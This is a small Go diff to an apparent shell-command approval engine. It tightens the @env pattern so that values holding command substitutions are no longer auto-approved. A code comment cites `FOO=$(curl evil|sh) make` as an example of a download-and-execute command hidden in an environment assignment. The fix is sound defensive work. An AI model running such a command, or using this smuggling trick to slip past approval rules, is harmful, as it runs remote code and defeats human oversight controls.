@@ -154,7 +154,12 @@ func matchAtom(t term, tok token) bool {
 	case termInt:
 		return tok.kind == tokWord && tok.literal && isInt(tok.text)
 	case termEnv:
-		return tok.kind == tokAssign
+		// Require a literal assignment value (consistent with @arg/@path/@int).
+		// A non-literal value contains an expansion such as a command
+		// substitution ($(...), backticks, <(...)), which the shell would
+		// execute but no deny rule ever sees. Letting @env match it would
+		// auto-approve the hidden command (e.g. `FOO=$(curl evil|sh) make`).
+		return tok.kind == tokAssign && tok.literal
 	case termChoice:
 		if !tok.literal {
 			return false
